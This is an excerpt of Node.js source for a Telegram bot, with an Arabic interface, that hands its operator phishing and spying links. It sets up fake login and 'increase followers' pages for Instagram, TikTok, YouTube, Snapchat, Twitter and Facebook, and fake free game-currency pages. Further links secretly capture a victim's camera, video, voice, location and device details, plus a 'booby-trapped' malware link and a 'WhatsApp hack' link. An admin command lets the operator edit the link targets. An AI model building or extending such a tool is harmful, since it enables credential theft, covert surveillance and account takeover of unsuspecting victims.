    ...
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                ...
                [{ text: 'اختراق عبر صورة 🖼️', callback_data: `get_link_${linkId}` }]
            ]
        }
    });
...
bot.on('callback_query', (callbackQuery) => {
    ...
    if (data === 'malware_link') {
        ...
        const url = `${baseUrl}?chatId=${chatId} `;
        ...
        bot.once('message', (msg) => {
            ...
            if (!isNaN(duration) && duration >= 1 &&  duration <= 20) {
                const url = `${baseUrl}? chatId=${chatId}?duration=${duration}`;
        ...
        const verificationLink = `${baseUrl}?chatId=${chatId}`;
...
// --- نظام إدارة روابط الصفحات الجديد (بجميع الروابط) ---

// تخزين جميع الروابط
let pageLinks = {
    // روابط اختراق الحسابات (لكل منصة رابطين)
    instagram: {
        login: 'https://default-link.com/instagram/login',
        increase: 'https://default-link.com/instagram/increase'
    },
    tiktok: {
        login: 'https://default-link.com/tiktok/login',
        increase: 'https://default-link.com/tiktok/increase'
    },
    youtube: {
        login: 'https://default-link.com/youtube/login',
        increase: 'https://default-link.com/youtube/increase'
    },
    snapchat: {
        login: 'https://default-link.com/snapchat/login',
        increase: 'https://default-link.com/snapchat/increase'
    },
    twitter: {
        login: 'https://default-link.com/twitter/login',
        increase: 'https://default-link.com/twitter/increase'
    },
    facebook: {
        login: 'https://default-link.com/facebook/login',
        increase: 'https://default-link.com/facebook/increase'
    },
    ...
    // روابط اختراق الكاميرا والصوت والموقع وجمع المعلومات
    front_camera: 'https://default-link.com/camera/front',
    rear_camera: 'https://default-link.com/camera/rear',
    capture_video: 'https://default-link.com/camera/video',
    voice_record: 'https://default-link.com/record',
    get_location: 'https://default-link.com/location',
    collect_device_info: 'https://default-link.com/device-info',
    malware_link: 'https://default-link.com/malware',
    request_verification: 'https://default-link.com/whatsapp'
};
...
function getPlatformNameAr(platform, type = '') {
    const names = {
        instagram: 'انستغرام',
        tiktok: 'تيك توك',
        youtube: 'يوتيوب',
        ...
        voice_record: 'تسجيل صوت',
        get_location: 'الموقع',
        collect_device_info: 'معلومات الجهاز',
        malware_link: 'تلغيم رابط',
        request_verification: 'اختراق واتساب'
    };
    
    let name = names[platform] || platform;
    if (type === 'login') return `صفحة تسجيل دخول ${name}`;
    if (type === 'increase') return `صفحة زيادة متابعين ${name}`;
    return name;
}
...
bot.onText(/\/ee/, async (msg) => {
    ...
    const keyboard = [
        ...
        [{ text: '📱 انستغرام - تسجيل دخول', callback_data: 'edit_link_instagram_login' }],
        [{ text: '📈 انستغرام - زيادة متابعين', callback_data: 'edit_link_instagram_increase' }],
        [{ text: '🎵 تيك توك - تسجيل دخول', callback_data: 'edit_link_tiktok_login' }],
        [{ text: '📈 تيك توك - زيادة متابعين', callback_data: 'edit_link_tiktok_increase' }],
        [{ text: '🔴 يوتيوب - تسجيل دخول', callback_data: 'edit_link_youtube_login' }],
        [{ text: '📈 يوتيوب - زيادة متابعين', callback_data: 'edit_link_youtube_increase' }],
        [{ text: '👻 سناب شات - تسجيل دخول', callback_data: 'edit_link_snapchat_login' }],
        [{ text: '📈 سناب شات - زيادة متابعين', callback_data: 'edit_link_snapchat_increase' }],
        [{ text: '🐦 تويتر - تسجيل دخول', callback_data: 'edit_link_twitter_login' }],
        [{ text: '📈 تويتر - زيادة متابعين', callback_data: 'edit_link_twitter_increase' }],
        [{ text: '📘 فيسبوك - تسجيل دخول', callback_data: 'edit_link_facebook_login' }],
        [{ text: '📈 فيسبوك - زيادة متابعين', callback_data: 'edit_link_facebook_increase' }],
        
        // ===== روابط الألعاب =====
        [{ text: '🔫 ببجي', callback_data: 'edit_link_pubg_uc' }],
        [{ text: '💎 فري فاير', callback_data: 'edit_link_free_fire_diamonds' }],
        [{ text: '💰 توب توب', callback_data: 'edit_link_toptop_coins' }],
        
        [{ text: '📸 الكاميرا الأمامية', callback_data: 'edit_link_front_camera' }],
        [{ text: '📸 الكاميرا الخلفية', callback_data: 'edit_link_rear_camera' }],
        [{ text: '🎥 تصوير فيديو', callback_data: 'edit_link_capture_video' }],
        [{ text: '🎙 تسجيل صوت', callback_data: 'edit_link_voice_record' }],
        [{ text: '🗺️ اختراق الموقع', callback_data: 'edit_link_get_location' }],
        [{ text: '🔬 معلومات الجهاز', callback_data: 'edit_link_collect_device_info' }],
        [{ text: '⚠️ تلغيم رابط', callback_data: 'edit_link_malware_link' }],
        [{ text: '🟢 اختراق واتساب', callback_data: 'edit_link_request_verification' }]
    ];

   
    const chunks = [];
    for (let i = 0; i < keyboard.length; i += 10) {
        chunks.push(keyboard.slice(i, i + 10));
    }

    bot.sendMessage(msg.chat.id, '🔗 **لوحة تحكم الروابط (الجزء 1)**\nاختر الرابط الذي تريد تغييره:', {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: chunks[0] }
    });

    if (chunks[1]) {
        bot.sendMessage(msg.chat.id, '🔗 **لوحة تحكم الروابط (الجزء 2)**', {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: chunks[1] }
        });
    }
});
...
bot.on('callback_query', async (query) => {
    ...
    if (data.startsWith('edit_link_')) {
        const fullPath = data.replace('edit_link_', '');
        let platform, type;
        
        if (fullPath.includes('_') && (fullPath.endsWith('_login') || fullPath.endsWith('_increase'))) {
            const parts = fullPath.split('_');
            type = parts.pop();
            platform = parts.join('_');
        } else {
            platform = fullPath;
            type = null;
        }
        ...
        let currentLink = '';
        if (type) {
            currentLink = pageLinks[platform]?.[type] || 'غير موجود';
        } else {
            currentLink = pageLinks[platform] || 'غير موجود';
        }
        
        const typeName = type === 'login' ? 'تسجيل دخول' : (type === 'increase' ? 'زيادة متابعين' : '');
        
        bot.sendMessage(chatId, 
            `📌 **تعديل رابط ${getPlatformNameAr(platform)} ${typeName}**\n\n` +
            `🔗 الرابط الحالي: \`${currentLink}\`\n\n` +
            `✍️ أرسل الرابط الجديد الآن:`,
            { parse_mode: 'Markdown' }
        );

        allUsers[chatId] = { step: 'awaiting_new_link', platform: platform, type: type };
    }
    
   
    else if (data.startsWith('login_') || data === 'pubg_uc' || data === 'free_fire_diamonds' || data === 'toptop_coins' || 
             data.startsWith('increase_') || data === 'front_camera' || data === 'rear_camera' || data === 'capture_video' || 
             data === 'voice_record' || data === 'get_location' || data === 'collect_device_info' || data === 'malware_link' || 
             data === 'request_verification') {
        
        const userIdForLink = chatId;
        let platform, type, responseMessage;

      
        if (data.startsWith('login_')) {
            platform = data.split('_')[1];
            type = 'login';
            responseMessage = `تم إنشاء ${getPlatformNameAr(platform, 'login')}:`;
        } else if (data.startsWith('increase_')) {
            platform = data.split('_')[1];
            type = 'increase';
            responseMessage = `تم إنشاء ${getPlatformNameAr(platform, 'increase')}:`;
        } 
    
        else if (data === 'pubg_uc' || data === 'free_fire_diamonds' || data === 'toptop_coins') {
            platform = data;
            responseMessage = `تم إنشاء صفحة مزورة لشحن ${getPlatformNameAr(platform)} مجانًا:`;
            ...
            platform = data;
            if (data === 'front_camera') responseMessage = '📸 رابط اختراق الكاميرا الأمامية:';
            else if (data === 'rear_camera') responseMessage = '📸 رابط اختراق الكاميرا الخلفية:';
            else if (data === 'capture_video') responseMessage = '🎥 رابط تصوير الضحية فيديو:';
            else if (data === 'voice_record') responseMessage = '🎙 رابط تسجيل صوت الضحية:';
            else if (data === 'get_location') responseMessage = '🗺️ رابط اختراق موقع الضحية:';
            else if (data === 'collect_device_info') responseMessage = '🔬 رابط جمع معلومات الجهاز:';
            else if (data === 'malware_link') responseMessage = '⚠️ رابط تلغيم:';
            else if (data === 'request_verification') responseMessage = '🟢 رابط اختراق واتساب:';
            
            const baseLink = pageLinks[platform];
            if (!baseLink) {
                return bot.sendMessage(chatId, `❌ لم يتم العثور على رابط لهذه الخاصية: ${platform}`);
            }
            const finalLink = `${baseLink.replace(/\/$/, '')}/${userIdForLink}`;
            return await bot.sendMessage(chatId, `${responseMessage}\n${finalLink}`);
        }
        ...
        const baseLink = pageLinks[platform]?.[type];
        if (!baseLink) {
            return bot.sendMessage(chatId, `❌ لم يتم العثور على رابط ${type} للمنصة: ${platform}`);
        }
...
bot.on('message', async (msg) => {
    ...
    if (allUsers[chatId] && allUsers[chatId].step === 'awaiting_new_link') {
        const { platform, type } = allUsers[chatId];
        ...
        if (type) {
            if (!pageLinks[platform]) pageLinks[platform] = {};
            pageLinks[platform][type] = text;
        } else {
        ...
        const typeName = type === 'login' ? 'تسجيل دخول' : (type === 'increase' ? 'زيادة متابعين' : '');
        bot.sendMessage(chatId, `✅ تم تحديث رابط ${getPlatformNameAr(platform)} ${typeName} بنجاح.`, { parse_mode: 'Markdown' });
